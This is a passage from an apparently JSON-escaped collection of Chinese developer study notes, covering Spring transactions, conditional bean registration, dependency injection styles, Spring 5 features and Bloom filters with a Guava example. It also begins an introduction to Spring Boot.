}\n}\n```\n手动回滚事务一定要加上@Transactional，不然会报以下错误：\n```\norg.springframework.transaction.NoTransactionException: No transaction aspect-managed TransactionStatus in scope\n```\n想想也是，不开启事务，何来手动回滚，所以@Transactional必不可少。\n\n## @Transactional 注解详解\n声明式事务管理建立在AOP之上的。其本质是对方法前后进行拦截，然后在目标方法开始之前创建或者加入一个事务，在执行完目标方法之后根据执行情况提交或者回滚事务。\n简而言之，@Transactional注解在代码执行出错的时候能够进行事务的回滚。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220420110219.png)\n\n### 使用说明\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220420110303.png)\n\n- 需要在启动类上添加@EnableTransactionManagement注解。\n- 当作用于类上时，该类的所有 public 方法将都具有该类型的事务属性，同时，我们也可以在方法级别使用该标注来覆盖类级别的定义。\n- 在项目中，@Transactional(rollbackFor=Exception.class)，如果类加了这个注解，那么这个类里面的方法抛出异常，就会回滚，数据库里面的数据也会回滚。\n- 在@Transactional注解中如果不配置rollbackFor属性,那么事物只会在遇到RuntimeException的时候才会回滚,加上rollbackFor=Exception.class,可以让事物在遇到非运行时异常时也回滚。\n\n\n### 注解失效问题\n\n正常情况下，只要在方法上添加@Transactional注解就完事了，但是需要注意的是，虽然使用简单，但是如果不合理地使用注解，还是会存在注解失效的问题。\n\n#### @Transactional应用在非public修饰的方法上\n\n事务拦截器在目标方法执行前后进行拦截，内部会调用方法来获取Transactional 注解的事务配置信息，调用前会检查目标方法的修饰符是否为 public，不是 public则不会获取@Transactional 的属性配置信息。\n\n#### @Transactional注解属性rollbackFor设置错误\n\nrollbackFor 可以指定能够触发事务回滚的异常类型。Spring默认抛出了未检查unchecked异常（继承自 RuntimeException 的异常）或者 Error才回滚事务；其他异常不会触发回滚事务。如果在事务中抛出其他类型的异常，但却期望 Spring 能够回滚事务，就需要指定rollbackFor属性。\n\n#### 同一个类中方法调用，导致@Transactional失效\n\n开发中避免不了会对同一个类里面的方法调用，比如有一个类Test，它的一个方法A，A再调用本类的方法B（不论方法B是用public还是private修饰），但方法A没有声明注解事务，而B方法有。则外部调用方法A之后，方法B的事务是不会起作用的。这也是经常犯错误的一个地方。\n\n那为啥会出现这种情况？其实这还是由于使用Spring AOP代理造成的，因为只有当事务方法被当前类以外的代码调用时，才会由Spring生成的代理对象来管理。\n\n#### 异常被你的catch“吃了”导致@Transactional失效\n\n如果你手动的catch捕获这个异常并进行处理，事务管理器会认为当前事务应该正常commit，就会导致注解失效，如果非要捕获且不失效，就必须在代码块内throw new Exception抛出异常。\n\n#### 数据库引擎不支持事务\n\n开启事务的前提就是需要数据库的支持，我们一般使用的Mysql引擎时支持事务的，所以一般不会出现这种问题。\n\n# IOC相关注解\n## @Bean注解\nSpring的@Bean注解用于告诉方法，给spring容器添加组件，以方法名作为组件的id，方法的返回类型作为组件类型，方法的返回值作为组件的实例。\n```java\n@Bean\npublic static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {\n\t\treturn new PropertySourcesPlaceholderConfigurer();\n}\n```\n\n如果@Bean修饰的方法中的带有参数，则会从IOC容器中默认会以@Autowired形式给参数注入，如果IOC容器中没有该类型，即无法完成注入，则会报`springbean循环依赖`的错。也可以通过@Value，@Qualifier注解来改变注入方式\n```java\n@Bean(name = \"dataSource\")\npublic DataSource dataSource(@Value(\"${jdbc.driverClass}\") String driverClassName,\n\t\t@Value(\"${jdbc.jdbcUrl}\") String url, @Value(\"${jdbc.user}\") String username,\n\t\t@Value(\"${jdbc.password}\") String password) {\n\t\tDriverManagerDataSource dataSource = new DriverManagerDataSource();\n\t\tdataSource.setDriverClassName(driverClassName);\n\t\tdataSource.setUrl(url);\n\t\tdataSource.setUsername(username);\n\t\tdataSource.setPassword(password);\n\t\treturn dataSource;\n}\n@Bean(name = \"jdbcTemplate\")\npublic JdbcTemplate jdbcTemplate(@Qualifier(value = \"dataSource\") DataSource dataSource) {\n\t\treturn new JdbcTemplate(dataSource);\n}\n```\n\n因为如果IOC容器中没有这个类型，即无法完成注入，则会报错，所以防止这种情况的产生，我们一般使用`条件注入`的方法,如下\n```java\n@Bean\n@ConditionalOnBean(Person.class)\npublic Person person(Person p){\n\treturn p;\n}\n```\n\n## @Conditional注解\n### 基本介绍\n- @Conditional注解是一个条件装配注解，主要用于限制@Bean注解在什么时候才生效。以指定的条件形式控制bean的创建\n- @Conditional可以自定义条件进行装配或者不装配…\n- @Conditional本身还是一个父注解，派生出大量的子注解；可以按需加载！\n- 因此在学习SpringBoot的时候是非常有必要学习这个注解的使用的，SpringBoot就是按需加载。\n- Conditional注解和所有子注解首先必须依托@Configuration配置类注解\n- 都可以加载类或者方法上；加载类上的含义所有的方法都按照这个条件装配、加载方法上只有该方法进行条件装配。\n- 注：Conditional注解是Spring4.0就有的，旗下的子注解是SpringBoot1.0有的。\n\n### 使用\n@Conditional注解源码\n```java\n@Target({ElementType.TYPE, ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface Conditional {\n\t\n\t// 自定义类实现Condition接口，完成给出指定的条件。\n\tClass<? extends Condition>[] value();\n\n}\n```\n\n#### 自定义条件\n使用Conditional注解进行条件装配时需要自定义类实现Condition接口（spring包下的，不是JUC包下）\n\n如下实现的效果为：如果存在dog1则不会对条件装配bean进行创建。\n```java\npublic class MyCondition implements Condition {\n    /**\n     * @param context: 判断条件使用的上下文环境\n     * @param metadata: 扫描的注解信息\n     */\n    @Override\n    public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {\n        // 1. 获取bean工厂\n        ConfigurableListableBeanFactory beanFactory = context.getBeanFactory();\n        // 2. 获取运行环境, 可以根据操作系统的环境进行限制bean\n        Environment environment = context.getEnvironment();\n        // 3. 获取BeanDefinition注册定义表\n        context.getRegistry();\n        // 4. 获取资源加载器\n        context.getResourceLoader();\n        // 5. 获取类加载器\n        ClassLoader classLoader = context.getClassLoader();\n        if (beanFactory.containsBean(\"dog1\")) {\n            return false;\n        }\n        /**\n         *      可以根据以上条件进行条件装配\n         *      true: 装配\n         *      false： 不装配\n         */\n        return true;\n    }\n}\n```\n#### 条件装配测试\n```java\n@Configuration\npublic class MyConfig {\n\n    @Bean(\"user1\")\n    public User user1(){\n        return new User(\"splay\", 22, \"男\");\n    }\n\n\n    @Bean(\"dog1\")\n    //@ConditionalOnBean(name = {\"dog2\"})\n    public Dog dog1(){\n        return new Dog(\"金毛\", 4,\"公\");\n    }\n\n    @Bean(\"dog2\")\n    @Conditional(value = MyCondition.class)\n    public Dog dog2(){\n        return new Dog(\"拉布拉多\", 3,\"母\");\n    }\n}\n```\n在dog2上加上条件装配，当扫描到这个bean时会进行条件判断。\n\n### @condition的派生注解\n继@Conditional注解后，又基于此注解推出了很多派生注解，比如@ConditionalOnBean、@ConditionalOnMissingBean、@ConditionalOnExpression、@ConditionalOnClass…动态注入bean变得更方便了。\n\n- @ConditionalOnBean作用：判断当前需要注册的bean的实现类否被spring管理，如果被管理则注入，反之不注入\n- @ConditionalOnMissingBean作用：判断当前需要注入Spring容器中的bean的实现类是否已经含有，有的话不注入，没有就注入\n\n#### @ConditionalOnBean注解\n@ConditionalOnBean作用：判断当前需要注册的bean的实现类否被spring管理，如果被管理则注入，反之不注入\n\n@ConditionalOnBean注解其实也是Conditional注解的特定装配，只不过条件类已经实现好了。@ConditionalOnBean源码如下：\n```java\n@Target({ ElementType.TYPE, ElementType.METHOD })\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Conditional(OnBeanCondition.class) //OnBeanCondition是一个Condition接口的实现类\npublic @interface ConditionalOnBean {\n\n // 1. 按照bean的类型进行检查\n Class<?>[] value() default {};\n\n // 2. 按照bean的类型进行检查\n String[] type() default {};\n\n // 3. 按照bean的注解进行检查\n Class<? extends Annotation>[] annotation() default {};\n\n // 4. 按照BeanName进行检查\n String[] name() default {};\n\n // 5. 搜索策略\n SearchStrategy search() default SearchStrategy.ALL;\n\n // 6. 不详\n Class<?>[] parameterizedContainer() default {};\n}\n```\n\n##### 条件装配测试（一）\n当容器中存在dog1的时候再创建dog2，否则就不会进行创建。\n```java\n@Configuration\npublic class MyConfig {\n\n    @Bean(\"user1\")\n    public User user1(){\n        return new User(\"splay\", 22, \"男\");\n    }\n\n\n    @Bean(\"dog1\")\n    public Dog dog1(){\n        return new Dog(\"金毛\", 4,\"公\");\n    }\n\n    @Bean(\"dog2\")\n    @ConditionalOnBean(name = {\"dog1\"})\n    public Dog dog2(){\n        return new Dog(\"拉布拉多\", 3,\"母\");\n    }\n}\n```\n\n##### 条件装配测试（二）\n在使用时发现条件装配与bean的编写注册顺序有关系，如果先后顺序导致将会出现失败的情况。\n```java\n@Configuration\npublic class MyConfig {\n\n    @Bean(\"user1\")\n    public User user1(){\n        return new User(\"splay\", 22, \"男\");\n    }\n\n\n    @Bean(\"dog1\")\n    @ConditionalOnBean(name = {\"dog2\"})\t\t//当有dog2组件的时候创建dog1\n    public Dog dog1(){\n        return new Dog(\"金毛\", 4,\"公\");\n    }\n\n    @Bean(\"dog2\")\n    public Dog dog2(){\n        return new Dog(\"拉布拉多\", 3,\"母\");\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220502113404.png)\n\n对比上面测试一发现dog1并没有成功创建，猜测创建的时候估计是按照某种顺序进行的！因此在使用条件装配进行创建的时候一定要注意呗依赖的条件是否要先创建的问题！\n\n# spring5新特性\n整个 Spring5 框架的代码基于 Java8，运行时兼容 JDK9， 许多不建议使用的类和方\n法在代码库中删除\n## 日志封装\nSpring 5.0 框架自带了通用的日志封装\n（1）Spring5已经移除Log4jConfigListener，官方建议使用Log4j2\n（2）Spring5框架整合Log4j2\n使用方法\n第一步：引入jar包 \nlog4j-api.jar\nlog4j-core.jar\nlog4j-slf4j-impl.jar\nslf4j-api.jar\n第二步：创建log4j2.xml配置文件，文件名必须要为log4j2.xml\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!--日志级别以及优先级排序: OFF > FATAL > ERROR > WARN > INFO > DEBUG > TRACE >\nALL -->\n<!--Configuration 后面的 status 用于设置 log4j2 自身内部的信息输出，可以不设置，\n当设置成 trace 时，可以看到 log4j2 内部各种详细输出-->\n<configuration status=\"INFO\">\n\t<!--先定义所有的 appender-->\n\t<appenders>\n\t\t<!--输出日志信息到控制台-->\n\t\t<console name=\"Console\" target=\"SYSTEM_OUT\">\n\t\t<!--控制日志输出的格式-->\n\t\t<PatternLayout pattern=\"%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/>\n\t\t</console>\n\t</appenders>\n\n\t<!--然后定义 logger，只有定义 logger 并引入的 appender， appender 才会生效-->\n\t<!--root：用于指定项目的根日志，如果没有单独指定 Logger，则会使用 root 作为\n\t默认的日志输出-->\n\t<loggers>\n\t\t<root level=\"info\">\n\t\t\t<appender-ref ref=\"Console\"/>\n\t\t</root>\n\t</loggers>\n</configuration>\n```\n然后执行代码即可\n\n- 手动输出日志方法\n```java\npublic class UserLog{\n\tprivate static final Logger log = LoggerFactory.getLogger(UserLog.class);\n\n\tpublic static void main(String[] args){\n\t\tlog.info(\"hello log4j2\");\n\t\tlog.warn(\"hello log4j2\");\n\t}\n}\n```\n\n## @Nullable 注解\n@Nullable 注解可以使用在方法上面，属性上面，参数上面，表示方法返回可以为空，属性值可以\n为空，参数值可以为空\n```java\n@Nullable\nString getId();\n\npublic void getName(@Nullable String name);\n\n@Nullable\nprivate String name;\n```\n\n## GenericApplicationContext\nSpring5 核心容器支持函数式风格 GenericApplicationContext\n函数式风格创建对象，交给 spring 进行管理\n```java\npublic void testGenericApplicationContext(){\n\t//1. 创建 GenericApplicationContext 对象\n\tGenericApplicationContext context = new GenericApplicationContext();\n\t//2. 调用context的方法对象注册\n\tcontext.refresh();\n\tcontext.registerBean(\"user1\", User.class, ()->new User());\n\t//3. 获取在spring注册的对象\n\tUser user = (User) context.getBean(\"user1\");\n\tSystem.out.println(user); \n}\n```\n\n## spring5支持整合JUnit5\n### 整合 JUnit4\n第一步 引入 Spring 相关针对测试依赖\nhamcrest-core.jar\nspring-test.jar\njunit.jar\n第二步 创建测试类，使用注解方式完成\n```java\n@RunWith(SpringJUnit4ClassRunner.class)//指定用哪个单元测试框架\n@ContextConfiguration(\"classpath:bean1.xml\")//加载配置文件, 从而使用spring能识别下面的自动装配注解\npublic class JTest4{\n\t@Autowired\n\tprivate UserService userService;\n\n\t@Test //其注解包： org.junit.Test\n\tpublic void test1(){\n\t\tuserService.accountMoney();\n\t}\n}\n```\n### Spring5 整合 JUnit5\n第一步 引入 JUnit5 的 jar 包\nJunit5.jar\n第二步 创建测试类，使用注解完成\n```java\n@ExtendWith(SpringExtension.class)\n@ContextConfiguration(\"classpath:bean1.xml\")\npublic class JTest5 {\n\t@Autowired\n\tprivate UserService userService;\n\n\t@Test //其注解包： org.junit.jupiter.api.Test\n\tpublic void test1() {\n\t\tuserService.accountMoney();\n\t}\n}\n```\n- 使用一个复合注解替代上面两个注解完成整合\n```java\n@SpringJUnitConfig(locations = \"classpath:bean1.xml\")\npublic class JTest5 {\n\t@Autowired\n\tprivate UserService userService;\n\n\t@Test\n\tpublic void test1() {\n\t\tuserService.accountMoney();\n\t}\n}\n```\n\n# spring bean循环依赖\n今天在写业务代码的时候遇到了Spring Bean之间产生循环依赖的问题，报错信息为`the dependencies of some of the beans in the application context form a cycle`。\n\n排查代码，发现是我在A类中通过A类的构造函数注入了B类，而在B类中又通过B类的构造函数注入了A类导致的Spring Bean循环依赖问题。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124425.png)\n\nSpring Bean的循环依赖问题，是指类A通过构造函数注入类B的实例（或者B中声明的Bean），而类B通过构造函数注入类A的实例（或者A中声明的Bean），即将类A和类B的bean配置为相互注入，则Spring IoC容器会在运行时检测到此循环引用，并引发一个`BeanCurrentlyInCreationException`。与典型情况（没有循环依赖）不同，Bean A和Bean B之间的循环依赖关系迫使其中一个Bean在被完全初始化之前被注入到另一个Bean中（典型的一个【先有鸡还是先有蛋】场景）。\n\n解决的方法就是不使用基于构造函数的依赖注入，可通过下面两种方式达到目的：\n- 在实例变量上使用@Autowired注解，让Spring决定在合适的时机注入，而非在初始化类的时候就注入。\n- 用基于setter方法的依赖注入取代基于构造函数的依赖注入来解决循环依赖。\n\n# IDEA 警告 Field injection is not recommended\n前些天在开发过程中，发现 IDEA 在一个 @Autowired 注解上打了一个警告，内容是 Field injection is not recommended。多年面向 Spring 开发的经验告诉我，使用 @Autowired 注解进行依赖注入，肯定是没有问题的。但是我的代码洁癖不允许我这么不明不白的留一个警告在这里。所以，带着我的洁癖，和我的好奇心，我开始研究起了这个警告。\n\n## 警告信息\n这个警告，和警告的处理建议，在 IDEA 中是这么写的：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124435.png)\n\n翻译过来是这个意思：\n不建议直接在字段上进行依赖注入。\nSpring 开发团队建议：在 Java Bean 中永远使用构造方法进行依赖注入。对于必须的依赖，永远使用断言来确认。\n\n## 修改代码\n既然 IDE 给了警告，那就先着手修改。一开始，代码是这样子的：\n```java\npublic class AClass{\n    @Autowired\n    private DependencyClass aDependency;\n}\n```\n根据提示，我将代码修改成了这样子：\n```java\npublic class AClass {\n    private final DependencyClass aDependency;\n\n    public AClass(DependencyClass aDependency) {\n        this.aDependency = aDependency;\n    }\n}\n```\n然后警告就消失了，同时运行没有问题，说明这个修改是可行的。\n\n另外，如果你的项目中引入了 Lombok，那么代码甚至可以精简成这样子：\n```java\n// 该注解指示Lombok为所有没被初始化过的final的变量创建构造方法\n@RequiredArgsConstructor\npublic class AClass {\n    private final DependencyClass aDependency;\n}\n```\n但是，光是改好代码还远远不够，我需要知道，为什么 Spring 团队会提出这一项要求，以及，直接使用 @Autowired 进行依赖注入有什么问题。\n\n## 依赖注入的类型\n经过我的了解，Spring 有三种依赖注入的类型。\n\n**基于 field 的注入**\n所谓基于 field 的注入，就是在变量上使用 @Autowired 注解进行依赖注入。这是我们最熟悉的一种方式，同时，也正是 Spring 团队所不推荐的方式。它用起来就像这样：\n```java\n@Autowired\nprivate DependencyClass aDependency;\n```\n\n**基于 setter 方法的注入**\n通过 setter() 方法，以及在方法上加入 @Autowired 注解，来完成的依赖注入，就是基于 setter 方法的注入。它用起来就像这样：\n```java\nprivate DependencyClass aDependency;\n\n@Autowired\npublic void setADependency(DependencyClass aDependency) {\n    this.aDependency = aDependency;\n}\n```\n注：在 Spring 4.3 及以后的版本中，setter 上面的 @Autowired 注解是可以不写的。\n\n**基于构造方法的注入**\n将各个必需的依赖全部放在带有 @Autowired 注解构造方法的参数中，并在构造方法中完成对应变量的初始化，这种方式，就是基于构造方法的注入。它用起来就像这样：\n```java\npublic class AClass {\n    // 这里 final 修饰符并不是必须的，但是我喜欢这么做\n    // 因为这样不仅可以在代码上防止 aDependency 被修改\n    // 在语义上也可以表明 aDependency 是不应该被修改的\n    private final DependencyClass aDependency;\n\n    @Autowired\n    public AClass(DependencyClass aDependency) {\n        this.aDependency = aDependency;\n    }\n}\n```\n注：在 Spring 4.3 及以后的版本中，如果这个类只有一个构造方法，那么这个构造方法上面也可以不写 @Autowired 注解。\n\n## 基于 field 的注入有什么问题\n基于 field 的注入，虽然不是绝对禁止使用，但是它可能会带来一些隐含的问题。比如，在这篇[博客](https://blog.csdn.net/ruangong1203/article/details/50992147)中，作者给出了这样的一个代码：\n```java\n@Autowired\nprivate User user;\n\nprivate String school;\n\npublic UserAccountServiceImpl(){\n    this.school = user.getSchool();\n}\n```\n初看起来好像没有什么问题，User 类会被作为一个依赖被注入到当前类中，同时这个类的 school 属性将在初始化时通过 user.getSchool() 方法来获得值。但是，这个代码在运行时，却会抛出如下的异常：\n```\nException in thread \"main\" org.springframework.beans.factory.BeanCreationException: Error creating bean with name '...' defined in file [....class]: Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [...]: Constructor threw exception; nested exception is java.lang.NullPointerException\n```\n即，在执行 UserAccountServiceImpl() 这个构造方法时出现了 NPE。\n\n出现这个问题的原因是，Java 在初始化一个类时，是按照**静态变量或静态语句块 –> 实例变量或初始化语句块 –> 构造方法 -> @Autowired 的顺序**，那么显而易见，在执行这个类的构造方法时，user 对象尚未被注入，它的值还是 null，从而产生了 NPE。\n\n此外，在代码质量方面，因为基于 field 的注入用起来实在是太方便了，增加一个依赖只需要声明一个变量，然后给它加上 @Autowired 注解，就可以了。而这份便利，有可能会导致这个类的依赖变得越来越多，功能越来越杂，最终违反了单一功能原则。这虽然不会导致功能异常，但是这将增大后续维护的难度。（话虽然这么说，就算我用了基于构造方法的注入，但是用 Lombok 简化了构造方法，这么一来，增加一个依赖又变得更方便了，只需要加一行变量声明就行，如果在不注重代码质量的时候，这也会加剧类的膨胀。所以最后还是得靠工具和审查流程，以及开发者的自觉，来保证代码质量……）\n\n还有一点我个人的感受，就是基于 field 的注解会占据过多的屏幕空间。按照我个人的代码习惯，每个注入之间都要插入一行空行，来把它们分割开来。这意味着，每个注入都将占据 3 行。如果这个类有过多的依赖，那么很有可能光是依赖注入的部分，就会占据大半个屏幕，这会让我看起来很不舒服。当然，出现这种情况，可能同时也意味着这个类已经过于膨胀，违反单一功能原则了。\n\n# spring与springboot中，如何在static方法里用@Autowire或者@Resource注入的属性\n问题：我原本想在5的位置用成员变量2，但是因为位置5所在的方法时static的，怎么办？？\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124446.png)\n\n第一步：在位置1写注解@Component 使当前类成为一个bean对象。(@Controller,@service都行)\n第二步：在位置3写个static的变量\n第三步：写个@PostConstruct注解注解注释的方法，在这个方法里，将位置2的值赋值给位置3.\n第四步：就可以在位置5处用位置2的变量了。\n@PostConstruct注解作用：是Java EE 5引入的注解，Spring允许开发者在受管Bean中使用它。当DI容器实例化当前受管Bean时，@PostConstruct注解的方法会被自动触发，从而完成一些初始化工作，示例代码如下。\n\n# 手写spring\n\n以下代码是spring的基本用法，而我们这次就是手写来实现这个效果\n```java\npublic class Test {\n  public static void main (String[] args) {\n    AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(AppConfig.class);\n    UserService userService = applicationContext.get(\"userService\", UserService.class);\n    userService.test();\n  }\n}\n```\n\n## 代码\n\n"
  },
  {
    "title": "./notes/back-end/布隆过滤器.md",
    "body": "# 什么是布隆过滤器\n本质上布隆过滤器是一种数据结构，比较巧妙的概率型数据结构（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 “某样东西一定不存在或者可能存在”。\n相比于传统的 List、Set、Map 等数据结构，它更高效、占用空间更少，但是缺点是其返回的结果是概率性的，而不是确切的。\n\n# 实现原理\n## HashMap 的问题\n讲述布隆过滤器的原理之前，我们先思考一下，通常你判断某个元素是否存在用的是什么？应该蛮多人回答 HashMap 吧，确实可以将值映射到 HashMap 的 Key，然后可以在 O(1) 的时间复杂度内返回结果，效率奇高。但是 HashMap 的实现也有缺点，例如存储容量占比高，考虑到负载因子的存在，通常空间是不能被用满的，而一旦你的值很多例如上亿的时候，那 HashMap 占据的内存大小就变得很可观了。\n还比如说你的数据集存储在远程服务器上，本地服务接受输入，而数据集非常大不可能一次性读进内存构建 HashMap 的时候，也会存在问题。\n\n## 布隆过滤器数据结构\n布隆过滤器是一个 bit 向量或者说 bit 数组，长这样：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210707151442.png\" width=\"700px\"/>\n\n如果我们要映射一个值到布隆过滤器中，我们需要使用多个不同的哈希函数生成多个哈希值，并对每个生成的哈希值指向的 bit 位置 1，例如针对值 “baidu” 和三个不同的哈希函数分别生成了哈希值 1、4、7，则上图转变为：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210707151516.png\" width=\"700px\"/>\n\nOk，我们现在再存一个值 “tencent”，如果哈希函数返回 3、4、8 的话，图继续变为：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210707151531.png\" width=\"700px\"/>\n\n值得注意的是，4 这个 bit 位由于两个值的哈希函数都返回了这个 bit 位，因此它被覆盖了。现在我们如果想查询 “dianping” 这个值是否存在，哈希函数返回了 1、5、8三个值，结果我们发现 5 这个 bit 位上的值为 0，说明没有任何一个值映射到这个 bit 位上，因此我们可以很确定地说 “dianping” 这个值不存在。而当我们需要查询 “baidu” 这个值是否存在的话，那么哈希函数必然会返回 1、4、7，然后我们检查发现这三个 bit 位上的值均为 1，那么我们可以说 “baidu” 存在了么？答案是不可以，只能是 “baidu” 这个值可能存在。\n\n这是为什么呢？答案跟简单，因为随着增加的值越来越多，被置为 1 的 bit 位也会越来越多，这样某个值 “taobao” 即使没有被存储过，但是万一哈希函数返回的三个 bit 位都被其他值置位了 1 ，那么程序还是会判断 “taobao” 这个值存在。\n\n幸运的是，布隆过滤器有一个可预测的误判率（FPP）：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210707151654.png\" width=\"200px\"/>\n- n 是已经添加元素的数量；\n- k 哈希的次数；\n- m 布隆过滤器的长度（如比特数组的大小）；\n\n极端情况下，当布隆过滤器没有空闲空间时（满），每一次查询都会返回 true 。这也就意味着 m 的选择取决于期望预计添加元素的数量 n ，并且 m 需要远远大于 n 。\n实际情况中，布隆过滤器的长度 m 可以根据给定的误判率（FFP）的和期望添加的元素个数 n 的通过如下公式计算：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210707151736.png\" width=\"200px\"/>\n\n了解完上述的内容之后，我们可以得出一个结论，当我们搜索一个值的时候，若该值经过 K 个哈希函数运算后的任何一个索引位为 ”0“，那么该值肯定不在集合中。但如果所有哈希索引值均为 ”1“，则只能说该搜索的值可能存在集合中。\n\n## 支持删除么\n感谢评论区提醒，传统的布隆过滤器并不支持删除操作\n\n# 布隆过滤器应用\n在实际工作中，布隆过滤器常见的应用场景如下：\n- 网页爬虫对 URL 去重，避免爬取相同的 URL 地址；\n- 反垃圾邮件，从数十亿个垃圾邮件列表中判断某邮箱是否垃圾邮箱；\n- Google Chrome 使用布隆过滤器识别恶意 URL；\n- Medium 使用布隆过滤器避免推荐给用户已经读过的文章；\n- Google BigTable，Apache HBbase 和 Apache Cassandra 使用布隆过滤器减少对不存在的行和列的查找。\n除了上述的应用场景之外，布隆过滤器还有一个应用场景就是解决缓存穿透的问题。所谓的缓存穿透就是服务调用方每次都是查询不在缓存中的数据，这样每次服务调用都会到数据库中进行查询，如果这类请求比较多的话，就会导致数据库压力增大，这样缓存就失去了意义。\n\n利用布隆过滤器我们可以预先把数据查询的主键，比如用户 ID 或文章 ID 缓存到过滤器中。当根据 ID 进行数据查询的时候，我们先判断该 ID 是否存在，若存在的话，则进行下一步处理。若不存在的话，直接返回，这样就不会触发后续的数据库查询。需要注意的是缓存穿透不能完全解决，我们只能将其控制在一个可以容忍的范围内。\n\n# 布隆过滤器实战\n布隆过滤器有很多实现和优化，由 Google 开发著名的 Guava 库就提供了布隆过滤器（Bloom Filter）的实现。在基于 Maven 的 Java 项目中要使用 Guava 提供的布隆过滤器，只需要引入以下坐标：\n```xml\n<dependency>\n   <groupId>com.google.guava</groupId>\n   <artifactId>guava</artifactId>\n   <version>28.0-jre</version>\n</dependency>\n```\n在导入 Guava 库后，我们新建一个 BloomFilterDemo 类，在 main 方法中我们通过 BloomFilter.create 方法来创建一个布隆过滤器，接着我们初始化 1 百万条数据到过滤器中，然后在原有的基础上增加 10000 条数据并判断这些数据是否存在布隆过滤器中：\n```java\nimport com.google.common.base.Charsets;\nimport com.google.common.hash.BloomFilter;\nimport com.google.common.hash.Funnels;\n\npublic class BloomFilterDemo {\n    public static void main(String[] args) {\n        int total = 1000000; // 总数量\n        BloomFilter<CharSequence> bf = BloomFilter.create(Funnels.stringFunnel(Charsets.UTF_8), total);\n        // 初始化 1000000 条数据到过滤器中\n        for (int i = 0; i < total; i++) {\n            bf.put(\"\" + i);\n        }\n        // 判断值是否存在过滤器中\n        int count = 0;\n        for (int i = 0; i < total + 10000; i++) {\n            if (bf.mightContain(\"\" + i)) {\n                count++;\n            }\n        }\n        System.out.println(\"已匹配数量 \" + count);\n    }\n}\n```\n以上代码运行后，控制台会输出以下结果：\n```\n已匹配数量 1000309\n```\n很明显以上的输出结果已经出现了误报，因为相比预期的结果多了 309 个元素，误判率为：`309/(1000000 + 10000) * 100 ≈ 0.030594059405940593`\n如果要提高匹配精度的话，我们可以在创建布隆过滤器的时候设置误判率 fpp为`0.0002`：\n```java\nBloomFilter<CharSequence> bf = BloomFilter.create(\n  Funnels.stringFunnel(Charsets.UTF_8), total, 0.0002\n);\n```\n在 BloomFilter 内部，误判率 fpp 的默认值是 0.03：\n```java\n// com/google/common/hash/BloomFilter.class\npublic static <T> BloomFilter<T> create(Funnel<? super T> funnel, long expectedInsertions) {\n  return create(funnel, expectedInsertions, 0.03D);\n}\n```\n在重新设置误判率为 0.0002 之后，我们重新运行程序，这时控制台会输出以下结果：\n```\n已匹配数量 1000003\n```\n通过观察以上的结果，可知误判率 fpp 的值越小，匹配的精度越高。当减少误判率 fpp 的值，需要的存储空间也越大，所以在实际使用过程中需要在误判率和存储空间之间做个权衡。\n"
  },
  {
    "title": "./notes/back-end/springboot.md",
    "body": "# SpringBoot的优点\n- 创建独立Spring引用\n- 内嵌web服务器\n- 自动starter依赖，简化构建配置\n- 提供生产级别的监控、健康检查及外部化配置\n- 无代码生成，无需编写xml\n\n# Hello World\n需求：浏览器发送/hello请求，响应Hello World\n**引入Maven依赖**\n```xml\n<parent>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-parent</artifactId>\n  <version>2.3.4.RELEASE</version>\n</parent>\n\n<dependencies>\n  <dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n  </dependency>\n</dependencies>\n```\n**创建主程序**\n```java\n/**\n* @SpringBootApplication的作用是说明这是一个SpringBoot应用\n*  必须要加这个注解\n*/\n@SpringBootApplication\npublic class MainApplication{\n  public static void main(String[] args){\n    SpringApplication.run(MainApplication.class, args);\n  }\n}\n```\n**编写业务**\n```java\n@RestController //等价于写上@ResponseBody与@Controller\npublic class HelloController{\n\n  @RequestMapping(\"/hello\")\n  public String handle(){\n    return \"hello World\";\n  }\n}\n```\n**测试**\n直接运行main方法即可，无需配置tomcat服务器\n**简化配置**\n我们可以将所有的有关springboot配置写在application.propertes文件中\n例如：\n```xml\nserver.port=8888\n```\n**简化部署**\n在没使用springboot之前，如果我们向将项目打包部署到tomcat上的话，必须要使用`<packaging>war</packaging>`将其打包成war包，然后将其部署到tomcat上。\n\n而在使用springboot提供的如下插件后，我们可以将其打包成jar包，而这个jar包中包含了tomcat的服务器，可以直接只用`java -jar`来运行这个web应用\n添加如下插件\n```xml\n<build>\n  <plugins>\n    <plugin>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-maven-plugin</artifactId>\n    </plugin>\n  </plugins>\n</build>\n```\n\n# 自动配置\n- 自动配好Tomcat\n- 自动配好SpringMVC\n- 自动配好Web常见功能，如：字符编码问题、文件上传视图解析器\n- 默认包扫描机制：从启动类所在包开始，扫描当前包及其子级包下的所有文件。\n\n# 底层注解\nFull模式与Lite模式\n- Full模式：将@Configuration中的proxyBeanMethods设置成true，此时每次使用通过IOC容器获得到的MyConfig实例，调用@Bean标注的方法时，springboot会检查IOC容器中是否有该实例，如果有，就返回IOC容器中的实例\n- Lite模式：将@Configuration中的proxyBeanMethods设置成false，此时每次使用通过IOC容器获得到的MyConfig实例，调用@Bean标注的方法时，springboot不会检查IOC容器中是否有该实例，而是直接new一个\n\n**何时使用Full模式，何时使用Lite模式**\n- 